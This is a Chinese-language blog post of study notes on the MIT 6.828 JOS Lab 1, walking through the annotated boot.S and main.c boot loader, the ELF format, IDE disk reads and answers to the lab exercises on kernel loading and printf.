<h5 id="段描述符"><a href="#段描述符" class="headerlink" title="段描述符"></a>段描述符</h5><p>段描述符（8个字节）是段描述符表这个“数组”的“元素”。用C结构体描述如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">gdtdesc</span> &#123;</span></div><div class="line">	u16 lim0_15;</div><div class="line">	u16 base0_15;</div><div class="line">	u8 base16_23;</div><div class="line">	u8 acces;</div><div class="line">	u8 lim16_19:<span class="number">4</span>;</div><div class="line">	u8 other:<span class="number">4</span>;</div><div class="line">	u8 base24_31;</div><div class="line">&#125; __attribute__ ((packed));</div></pre></td></tr></table></figure></p>
<p>其中总共包含了32位的段基址、20位的段界限、以及12位的类型。<br>段基址规定了段的起始地址。段界限规定了段的大小。而类型用于区别不同类型的描述符。包括描述符特权级、段存在位、已访问位等等。</p>
<h4 id="boot-S代码详解"><a href="#boot-S代码详解" class="headerlink" title="boot.S代码详解"></a>boot.S代码详解</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div></pre></td><td class="code"><pre><div class="line">#include &lt;<span class="keyword">inc</span>/mmu.h&gt;</div><div class="line"></div><div class="line"># Start the <span class="meta">CPU</span>: switch to <span class="number">32</span>-bit protected mode, jump <span class="keyword">into</span> C.</div><div class="line"># The BIOS loads this code from the first sector of the hard disk <span class="keyword">into</span></div><div class="line"># memory <span class="meta">at</span> physical address <span class="number">0x7c00</span> <span class="keyword">and</span> starts executing <span class="keyword">in</span> real mode</div><div class="line"># with %cs=<span class="number">0</span> %ip=7c00.</div><div class="line"># boot.S 主要将<span class="meta">CPU</span>切换至<span class="number">32</span>位保护模式，并且跳转进入C代码</div><div class="line"><span class="meta"></span></div><div class="line">.set PROT_MODE_CSEG, <span class="number">0x8</span>         # kernel code <span class="meta">segment</span> selector</div><div class="line"><span class="meta">.set</span> PROT_MODE_DSEG, <span class="number">0x10</span>        # kernel data <span class="meta">segment</span> selector</div><div class="line"><span class="meta">.set</span> CR0_PE_ON,      <span class="number">0x1</span>         # protected mode enable flag</div><div class="line"><span class="meta"></span></div><div class="line">.globl start</div><div class="line"><span class="symbol">start:</span>                        # 程序入口</div><div class="line"><span class="meta">  .code16</span>                     # Assemble for <span class="number">16</span>-bit mode 指导生成<span class="number">16</span>位汇编代码</div><div class="line">  <span class="keyword">cli</span>                         # Disable interrupts 关中断</div><div class="line">  <span class="keyword">cld</span>                         # String operations increment 设置串传递顺序递增</div><div class="line"></div><div class="line">  # Set <span class="meta">up</span> the important data <span class="meta">segment</span> registers (<span class="built_in">DS</span>, <span class="built_in">ES</span>, <span class="built_in">SS</span>). 设置重要的段寄存器为<span class="number">0</span></div><div class="line">  xorw    %ax,%ax             # <span class="meta">Segment</span> number <span class="meta">zero</span></div><div class="line">  movw    %ax,%ds             # -&gt; Data <span class="meta">Segment</span></div><div class="line">  movw    %ax,%es             # -&gt; Extra <span class="meta">Segment</span></div><div class="line">  movw    %ax,%ss             # -&gt; Stack <span class="meta">Segment</span></div><div class="line"></div><div class="line">  # Enable A20:</div><div class="line">  #   For backwards compatibility with the earliest PCs, physical</div><div class="line">  #   address line <span class="number">20</span> is tied low, so that addresses higher than</div><div class="line">  #   1MB wrap around to <span class="meta">zero</span> by <span class="meta">default</span>.  This code undoes this.</div><div class="line">  # 开启A20：</div><div class="line">  #   A20的介绍已经给出，不再赘述。</div><div class="line"><span class="symbol">seta20.1:</span></div><div class="line">  inb     <span class="number">$0</span>x64,%al               # Wait for <span class="keyword">not</span> busy 等待缓冲区可用</div><div class="line">  testb   <span class="number">$0</span>x2,%al                # <span class="keyword">Test</span> for bit1 - if bit1 = <span class="number">1</span> then buffer is full</div><div class="line">  <span class="keyword">jnz</span>     seta20<span class="meta">.1</span></div><div class="line"></div><div class="line">  movb    <span class="number">$0</span>xd1,%al               # <span class="number">0xd1</span> -&gt; port <span class="number">0x64</span></div><div class="line">  outb    %al,<span class="number">$0</span>x64               # Prepare to write output port 准备写入输出端口</div><div class="line"><span class="symbol"></span></div><div class="line">seta20.2:</div><div class="line">  inb     <span class="number">$0</span>x64,%al               # Wait for <span class="keyword">not</span> busy 等待缓冲区可用</div><div class="line">  testb   <span class="number">$0</span>x2,%al</div><div class="line">  <span class="keyword">jnz</span>     seta20<span class="meta">.2</span>                # The same as above 同上</div><div class="line"></div><div class="line">  movb    <span class="number">$0</span>xdf,%al               # <span class="number">0xdf</span> -&gt; port <span class="number">0x60</span></div><div class="line">  outb    %al,<span class="number">$0</span>x60               # <span class="number">0xdf</span> -&gt; A20 gate enable command 打开A20</div><div class="line"></div><div class="line">  # Switch from real to protected mode, using a bootstrap GDT</div><div class="line">  # <span class="keyword">and</span> <span class="meta">segment</span> translation that makes virtual addresses</div><div class="line">  # identical to their physical addresses, so that the</div><div class="line">  # effective memory map does <span class="keyword">not</span> change during the switch.</div><div class="line">  <span class="keyword">lgdt</span>    gdtdesc                # Load gdt size/base to gdtr 设置全局描述符表</div><div class="line">  movl    %cr0, %eax             # Control register <span class="number">0</span>, bit0 is protected enable bit 读取控制寄存器<span class="number">0</span>的值，其Bit0为允许保护模式位</div><div class="line">  orl     $CR0_PE_ON, %eax       # Set PE 将允许保护模式位置<span class="number">1</span></div><div class="line">  movl    %eax, %cr0             # Update Control register <span class="number">0</span> 设置控制寄存器<span class="number">0</span></div><div class="line"></div><div class="line">  # Jump to next instruction, but <span class="keyword">in</span> <span class="number">32</span>-bit code <span class="meta">segment</span>.</div><div class="line">  # Switches processor <span class="keyword">into</span> <span class="number">32</span>-bit mode.</div><div class="line">  ljmp    $PROT_MODE_CSEG, $protcseg # 通过ljmp指令（跳转至下一条指令）进入保护模式</div><div class="line"><span class="meta"></span></div><div class="line">  .code32                     # Assemble for <span class="number">32</span>-bit mode 指导生成<span class="number">32</span>位汇编代码</div><div class="line"><span class="symbol">protcseg:</span></div><div class="line">  # Set <span class="meta">up</span> the protected-mode data <span class="meta">segment</span> registers 设置保护模式的数据段寄存器</div><div class="line">  movw    $PROT_MODE_DSEG, %ax    # Our data <span class="meta">segment</span> selector</div><div class="line">  movw    %ax, %ds                # -&gt; <span class="built_in">DS</span>: Data <span class="meta">Segment</span></div><div class="line">  movw    %ax, %es                # -&gt; <span class="built_in">ES</span>: Extra <span class="meta">Segment</span></div><div class="line">  movw    %ax, %fs                # -&gt; <span class="built_in">FS</span></div><div class="line">  movw    %ax, %gs                # -&gt; <span class="built_in">GS</span></div><div class="line">  movw    %ax, %ss                # -&gt; <span class="built_in">SS</span>: Stack <span class="meta">Segment</span></div><div class="line"></div><div class="line">  # Set <span class="meta">up</span> the stack pointer <span class="keyword">and</span> <span class="keyword">call</span> <span class="keyword">into</span> C. 设置栈指针并且调用C</div><div class="line">  movl    $start, %esp  # Stack has the opposite extension direction than Code 注意栈的延伸方向和代码段相反</div><div class="line">  <span class="keyword">call</span> bootmain #调用main.c中的bootmain函数</div><div class="line"></div><div class="line">  # If bootmain returns (it shouldn<span class="string">'t), loop.</span></div><div class="line">spin:</div><div class="line">  jmp spin</div><div class="line"></div><div class="line"># Bootstrap GDT 引导GDT</div><div class="line">.p2align 2                                # force 4 byte alignment</div><div class="line">gdt:</div><div class="line">  SEG_NULL				# null seg 默认第一个段描述符为空</div><div class="line">  SEG(STA_X|STA_R, 0x0, 0xffffffff)	# code seg 设置代码段描述符</div><div class="line">  SEG(STA_W, 0x0, 0xffffffff)	        # data seg 设置数据段描述符</div><div class="line">  # 关于SEG宏可以参考mmu.h</div><div class="line"></div><div class="line">gdtdesc:                                  # 用于设置全局段描述符寄存器</div><div class="line">  .word   0x17                            # sizeof(gdt) - 1 # Size of gdt</div><div class="line">  .long   gdt                             # address gdt # Base address of gdt</div></pre></td></tr></table></figure>
<hr>
<p>为了理解main.c，我们需要如下的知识储备。</p>
<h4 id="ELF文件格式"><a href="#ELF文件格式" class="headerlink" title="ELF文件格式"></a>ELF文件格式</h4><p>可执行和可链接格式（Executable and Linkable Format）是一种用于二进制文件、可执行文件、目标代码、共享库和核心转储格式文件。</p>
<p>ELF文件可以分为两种组成 - 链接视图（Linking View）和执行视图（Execution View）。这里我们只讨论执行视图。</p>
<p>执行视图的结构如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">+--------------------+</div><div class="line">|     ELF Header     |</div><div class="line">+--------------------+</div><div class="line">|Program Header Table|</div><div class="line">+--------------------+</div><div class="line">|      Segment 1     |</div><div class="line">+--------------------+</div><div class="line">|      Segment 2     |</div><div class="line">+--------------------+</div><div class="line">|         ...        |</div><div class="line">+--------------------+</div><div class="line">|Section Header Table|</div><div class="line">|       optinal      |</div><div class="line">+--------------------+</div></pre></td></tr></table></figure></p>
<p>ELF文件格式主要由ELF头（ELF Header）、程序头部表（Program Header Table）和节头部表（Section Header Table）组成。在执行视图中，节头部表是可选的。</p>
<p>有关于这些数据结构的C语言定义可以参考头文件<inc elf.h="">。</inc></p>
<ul>
<li>ELF头主要包含了ELF魔数、文件类型、程序头部表偏移和大小、程序入口等信息；</li>
<li>程序头部表可以看做一个数据结构的数组，每一个元素都描述了一个段。主要包含了段的偏移、段的虚拟地址、段的物理地址、段的大小等信息。</li>
</ul>
<h4 id="磁盘控制器"><a href="#磁盘控制器" class="headerlink" title="磁盘控制器"></a>磁盘控制器</h4><p>磁盘是电脑主要的存储媒介。磁盘是由盘片构成的。每个盘片有两面或者称为表面，表面覆盖着磁性记录材料。盘片中央有一个可以旋转的主轴，它使得盘片以固定的旋转速率旋转，通常是5400-15000转每分钟（Revolution Per Minute）。磁盘通常包含一个或多个这样的盘片，并封装在一个密封的容器内。</p>
<p>每一个表面是由一组称为磁道的同心圆组成。每个磁道被划分为一组扇区。每个扇区包含相等数量的数据位（通常是512字节），这些数据编码在扇区上的磁性材料中。扇区之间由一些间隙分隔开，这些间隙中不存储数据位。间隙用来标识扇区的格式化位。</p>
<p>磁盘的柱面是所有盘片表面上到主轴中心距离相等的磁道的集合。</p>
<p>对于磁盘的寻址通常分为CHS和LBA两种。</p>
<ol>
<li>CHS即柱面（cylinder）-磁头（head）-扇区（sector）寻址。每个盘片都对应着一个磁头，每一个盘片都被划分成柱面，每一个柱面都被划分成多个段。磁盘的最小存储单元是段。早期的IBM PC架构上采用CHS进行磁盘寻址。CHS是一个三元组，包括10bit的柱面号，8bit的磁头号以及6bit的扇区号。这样CHS的最大寻址范围为2^10 × 2^8 × 2^6 × 512 = 8GB。</li>
<li>随着磁盘容量的不断扩大，CHS的8GB寻址范围已经不能满足需要，现在的磁盘普遍采用逻辑区块地址（Logical Block Adress）的方式进行寻址来进行抽象。LBA是一个整数，代表磁盘上的一个逻辑区块编号，通过将这个整数转换成CHS格式来完成磁盘的具体寻址。LBA为48个bit，最大寻址范围为128PB。在本实验中，LBA按照旧的规范采用28个bit。</li>
</ol>
<p>IDE硬盘控制器（IDE Hard Drive Controller）的0x1F7端口读为磁盘0状态寄存器。<br>其Bit6为RDY Bit，当其置1表明磁盘上电完成。在对于磁盘做任何操作（除了复位）之前务必要保证该Bit为1。<br>其Bit7为BSY Bit，当其置1表明磁盘忙。在你向磁盘发送任何指令前务必保证该Bit为0。</p>
<p>通过IDE硬盘控制器读取扇区需要如下的步骤：</p>
<ol>
<li>向0x1F2端口写入待操作的扇区数目；</li>
<li>向0x1F3-0x1F5端口依次写入LBA的低24位；</li>
<li>向0x1F6端口的低4位写入LBA的高4位，向0x1F6端口的高4位写入驱动器地址；</li>
<li>向0x1F7端口写入读命令0x20。</li>
</ol>
<p>0x1F6寄存器又称Drive/Head寄存器。其低4位是LBA的高4位。其Bit5和Bit7一般是1。其Bit6为LBA位，当置1时表示启用LBA寻址。其Bit4为DRV位。用来选择驱动器，Master驱动器为0，Slave驱动器为1。这里我们将高4位置为0x1110</p>
<p>在使用读命令0x20之前需要完整的设置柱面/磁头/扇区。当这个命令完成，你可以从磁盘的数据寄存器（0x1F0端口）读取256个字（16Bits）。</p>
<h4 id="main-c代码详解"><a href="#main-c代码详解" class="headerlink" title="main.c代码详解"></a>main.c代码详解</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inc/x86.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inc/elf.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="comment">/**********************************************************************</span></div><div class="line"> * This a dirt simple boot loader, whose sole job is to boot</div><div class="line"> * an ELF kernel image from the first IDE hard disk.</div><div class="line"> *</div><div class="line"> * DISK LAYOUT</div><div class="line"> *  * This program(boot.S and main.c) is the bootloader.  It should</div><div class="line"> *    be stored in the first sector of the disk.</div><div class="line"> *</div><div class="line"> *  * The 2nd sector onward holds the kernel image.</div><div class="line"> *</div><div class="line"> *  * The kernel image must be in ELF format.</div><div class="line"> *</div><div class="line"> * BOOT UP STEPS</div><div class="line"> *  * when the CPU boots it loads the BIOS into memory and executes it</div><div class="line"> *</div><div class="line"> *  * the BIOS intializes devices, sets of the interrupt routines, and</div><div class="line"> *    reads the first sector of the boot device(e.g., hard-drive)</div><div class="line"> *    into memory and jumps to it.</div><div class="line"> *</div><div class="line"> *  * Assuming this boot loader is stored in the first sector of the</div><div class="line"> *    hard-drive, this code takes over...</div><div class="line"> *</div><div class="line"> *  * control starts in boot.S -- which sets up protected mode,</div><div class="line"> *    and a stack so C code then run, then calls bootmain()</div><div class="line"> *</div><div class="line"> *  * bootmain() in this file takes over, reads in the kernel and jumps to it.</div><div class="line"> **********************************************************************/</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> SECTSIZE	512</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> ELFHDR		((struct Elf *) 0x10000) <span class="comment">// scratch space</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">readsect</span><span class="params">(<span class="keyword">void</span>*, <span class="keyword">uint32_t</span>)</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">readseg</span><span class="params">(<span class="keyword">uint32_t</span>, <span class="keyword">uint32_t</span>, <span class="keyword">uint32_t</span>)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">bootmain</span><span class="params">(<span class="keyword">void</span>)</span></div><div class="line">&#123;</div><div class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Proghdr</span> *<span class="title">ph</span>, *<span class="title">eph</span>;</span></div><div class="line"></div><div class="line">	<span class="comment">// read 1st page off disk 从磁盘上读取第一页</span></div><div class="line">	readseg((<span class="keyword">uint32_t</span>) ELFHDR, SECTSIZE*<span class="number">8</span>, <span class="number">0</span>);</div><div class="line"></div><div class="line">	<span class="comment">// is this a valid ELF? 通过ELF魔数确认ELF有效</span></div><div class="line">	<span class="keyword">if</span> (ELFHDR-&gt;e_magic != ELF_MAGIC)</div><div class="line">		<span class="keyword">goto</span> bad;</div><div class="line"></div><div class="line">	<span class="comment">// load each program segment (ignores ph flags) 读取各个段</span></div><div class="line">	ph = (struct Proghdr *) ((<span class="keyword">uint8_t</span> *) ELFHDR + ELFHDR-&gt;e_phoff); <span class="comment">// 程序头部表的起始地址</span></div><div class="line">	eph = ph + ELFHDR-&gt;e_phnum; <span class="comment">// 程序头部表的结束地址</span></div><div class="line">	<span class="keyword">for</span> (; ph &lt; eph; ph++)</div><div class="line">		<span class="comment">// p_pa is the load address of this segment (as well</span></div><div class="line">		<span class="comment">// as the physical address)</span></div><div class="line">        <span class="comment">// p_pa是加载地址也是物理地址</span></div><div class="line">		readseg(ph-&gt;p_pa, ph-&gt;p_memsz, ph-&gt;p_offset);</div><div class="line"></div><div class="line">	<span class="comment">// call the entry point from the ELF header 从ELF头调用程序入口</span></div><div class="line">	<span class="comment">// note: does not return!</span></div><div class="line">	((<span class="keyword">void</span> (*)(<span class="keyword">void</span>)) (ELFHDR-&gt;e_entry))();</div><div class="line"></div><div class="line">bad:</div><div class="line">	<span class="comment">// stops simulation and breaks into the debug console</span></div><div class="line">	outw(<span class="number">0x8A00</span>, <span class="number">0x8A00</span>);</div><div class="line">	outw(<span class="number">0x8A00</span>, <span class="number">0x8E00</span>);</div><div class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</div><div class="line">		<span class="comment">/* do nothing */</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Read 'count' bytes at 'offset' from kernel into physical address 'pa'. 从内核的offset处读取count个字节到物理地址pa处</span></div><div class="line"><span class="comment">// Might copy more than asked 可能会读取超过count个（扇区对齐）</span></div><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">readseg</span><span class="params">(<span class="keyword">uint32_t</span> pa, <span class="keyword">uint32_t</span> count, <span class="keyword">uint32_t</span> offset)</span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">uint32_t</span> end_pa;</div><div class="line"></div><div class="line">	end_pa = pa + count; <span class="comment">// 结束物理地址</span></div><div class="line"></div><div class="line">	<span class="comment">// round down to sector boundary 对齐到扇区</span></div><div class="line">	pa &amp;= ~(SECTSIZE - <span class="number">1</span>);</div><div class="line"></div><div class="line">	<span class="comment">// translate from bytes to sectors, and kernel starts at sector 1</span></div><div class="line">	offset = (offset / SECTSIZE) + <span class="number">1</span>; <span class="comment">// 算出扇区数 注意扇区从1开始（0为引导扇区）</span></div><div class="line"></div><div class="line">	<span class="comment">// If this is too slow, we could read lots of sectors at a time.</span></div><div class="line">	<span class="comment">// We'd write more to memory than asked, but it doesn't matter --</span></div><div class="line">	<span class="comment">// we load in increasing order.</span></div><div class="line">    <span class="comment">// 在实际中我们往往将多个扇区一起读出以提高效率。</span></div><div class="line">	<span class="keyword">while</span> (pa &lt; end_pa) &#123;</div><div class="line">		<span class="comment">// Since we haven't enabled paging yet and we're using</span></div><div class="line">		<span class="comment">// an identity segment mapping (see boot.S), we can</span></div><div class="line">		<span class="comment">// use physical addresses directly.  This won't be the</span></div><div class="line">		<span class="comment">// case once JOS enables the MMU.</span></div><div class="line">        <span class="comment">// 考虑到我们没有开启分页以及boot.S中使用了一一对应的映射规则，加载地址和物理地址是一致的。</span></div><div class="line">		readsect((<span class="keyword">uint8_t</span>*) pa, offset);</div><div class="line">		pa += SECTSIZE;</div><div class="line">		offset++;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">waitdisk</span><span class="params">(<span class="keyword">void</span>)</span></div><div class="line">&#123;</div><div class="line">	<span class="comment">// wait for disk reaady 等待磁盘准备完毕。</span></div><div class="line">	<span class="keyword">while</span> ((inb(<span class="number">0x1F7</span>) &amp; <span class="number">0xC0</span>) != <span class="number">0x40</span>)</div><div class="line">		<span class="comment">/* do nothing */</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">readsect</span><span class="params">(<span class="keyword">void</span> *dst, <span class="keyword">uint32_t</span> offset)</span></div><div class="line">&#123;</div><div class="line">	<span class="comment">// wait for disk to be ready</span></div><div class="line">	waitdisk();</div><div class="line"></div><div class="line">	outb(<span class="number">0x1F2</span>, <span class="number">1</span>);		<span class="comment">// count = 1 0x1F2 Disk 0 sector count</span></div><div class="line">	<span class="comment">// Read one sector each time</span></div><div class="line">	outb(<span class="number">0x1F3</span>, offset); <span class="comment">// Disk 0 sector number (CHS Mode)</span></div><div class="line">	<span class="comment">// First sector's number</span></div><div class="line">	outb(<span class="number">0x1F4</span>, offset &gt;&gt; <span class="number">8</span>); <span class="comment">// Cylinder low (CHS Mode)</span></div><div class="line">	outb(<span class="number">0x1F5</span>, offset &gt;&gt; <span class="number">16</span>); <span class="comment">// Cylinder high (CHS Mode)</span></div><div class="line">	<span class="comment">// Cylinder number</span></div><div class="line">	outb(<span class="number">0x1F6</span>, (offset &gt;&gt; <span class="number">24</span>) | <span class="number">0xE0</span>); <span class="comment">// Disk 0 drive/head</span></div><div class="line">	<span class="comment">// MASK 11100000</span></div><div class="line">	<span class="comment">// Drive/Head Register: bit 7 and bit 5 should be set to 1</span></div><div class="line">	<span class="comment">// Bit6: 1 LBA mode, 0 CHS mode</span></div><div class="line">	outb(<span class="number">0x1F7</span>, <span class="number">0x20</span>);	<span class="comment">// cmd 0x20 - read sectors</span></div><div class="line">    <span class="comment">/*20H       Read sector with retry. NB: 21H = read sector</span></div><div class="line">                without retry. For this command you have to load</div><div class="line">                the complete circus of cylinder/head/sector</div><div class="line">                first. When the command completes (DRQ goes</div><div class="line">                active) you can read 256 words (16-bits) from the</div><div class="line">                disk's data register. */</div><div class="line"></div><div class="line"></div><div class="line">	<span class="comment">// wait for disk to be ready</span></div><div class="line">	waitdisk();</div><div class="line"></div><div class="line">	<span class="comment">// read a sector</span></div><div class="line">	insl(<span class="number">0x1F0</span>, dst, SECTSIZE/<span class="number">4</span>);</div><div class="line">	<span class="comment">// Data register: data exchange with 8/16 bits</span></div><div class="line">	<span class="comment">// insl port addr cnt: read cnt dwords from the input port</span></div><div class="line">	<span class="comment">// specified by port into the supplied output array addr.</span></div><div class="line">	<span class="comment">// dword: 4 bytes = 16 bits</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>练习3：</p>
<ol>
<li>0x7c2d: ljmp  $0x8, $0x7c32 从这句汇编指令之后处理器开始执行32位指令。ljmp指令导致了16位指令到32位指令的转变。</li>
<li>引导最后执行的指令是call *0x10018，内核的第一条指令是movw $0x1234,0x472。</li>
<li>内核的第一条指令位于0x10000c。</li>
<li>引导从程序头部表中得到段的数目以及每个段的大小，以此决定要从磁盘上读出多少个扇区。</li>
</ol>
<h4 id="加载内核"><a href="#加载内核" class="headerlink" title="加载内核"></a>加载内核</h4><p>本部分主要需要了解.text段.rodata段和.data段，并且使用objdump读取ELF格式的信息。</p>
<p>boot/Makefrag文件中指定了引导的text段的位置为0x7c00。</p>
<p>练习5：<br>修改了text段的加载地址使得汇编代码中的跳转地址出现错误，进而导致整个引导因为错误提前终止。</p>
<p>练习6：<br>结果是非常显然的，因为引导的作用就是将内核从磁盘加载进入内存中。使用objdump -h obj/kern/kernel我们可以看到如下的信息：<br>0 .text         00001809  f0100000  00100000  00001000  2**4<br>                CONTENTS, ALLOC, LOAD, READONLY, CODE<br>我们可以直到内核的text段会被加载至内存中0x100000（物理地址）处。</p>
<h3 id="第三部分-内核"><a href="#第三部分-内核" class="headerlink" title="第三部分 内核"></a>第三部分 内核</h3><h4 id="使用虚拟内存去解决位置依赖"><a href="#使用虚拟内存去解决位置依赖" class="headerlink" title="使用虚拟内存去解决位置依赖"></a>使用虚拟内存去解决位置依赖</h4><p>可以发现内核将自己链接至了非常高的虚拟地址，比如0xf0100000，为了将处理器虚拟地址的较低部分给用户程序去使用。将在下一个实验介绍这一现象。</p>
<p>实际上，许多的机器在物理内存中并没有0xf0100000这样的高地址。实际上由处理器的内存管理硬件将虚拟地址0xf0100000映射到了实际内存中的物理地址0x100000。</p>
<p>这涉及了分页机制以及页表。<br>在kern/entry.S设置CR0_PG标记之前，内存引用被当做线性地址。实际上，由于我们在boot/boot.S设置了线性地址到物理地址的一致映射，所以线性地址在这里可以等同于物理地址。<br>当CR0_PG标记被设置了之后，所有的内存引用都被当作虚拟地址。虚拟地址通过虚拟内存硬件被翻译成物理地址。<br>kern/entrypgdir.c将0xf0000000到0xf0400000的虚拟地址翻译为物理地址的0x000000到0x400000，也将0x00000000到0x00400000的虚拟地址翻译为物理地址的0x00000000到0x00400000。<br>引用这些地址范围以外的虚拟地址将会抛出缺页的异常。<br>但我们还没有为该异常设置中断处理程序。这会导致QEMU导出机器状态并退出。</p>
<p>练习7：<br>在movl %eax, %cr0指令（启动页表）之前，0x00100000出的内存不为空，0xf0100000出的内存全为0。<br>当stepi之后，0xf0100000处的内存和0x00100000处的内存完全一样。这表明我们已经成功启用了页表，并且完成了地址的映射。</p>
<h4 id="控制台的格式化字符串"><a href="#控制台的格式化字符串" class="headerlink" title="控制台的格式化字符串"></a>控制台的格式化字符串</h4><p>练习8：<br>缺失的代码为：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> <span class="string">'o'</span>:</div><div class="line">	num = getuint(&amp;ap, lflag);</div><div class="line">base = <span class="number">8</span></div><div class="line"><span class="keyword">goto</span> number;</div></pre></td></tr></table></figure></p>
<ol>
<li>console.c提供了基本的I/O操作，同时封装了cputchar、getchar等函数供printf.c中的printf使用。printf使用了vprintfmt去解析格式化字符串并提供可变参数的特性。</li>
<li>这段代码主要实现了换行。其首先检查了当前的光标是否超过了最大值，如果是，则证明需要进行换行。其将第1行到第MAX-1行的内容复制到第0行到第MAX-2行所在的内存中，然后将第MAX-1行置空。最后将光标设置到新一行的开始。</li>
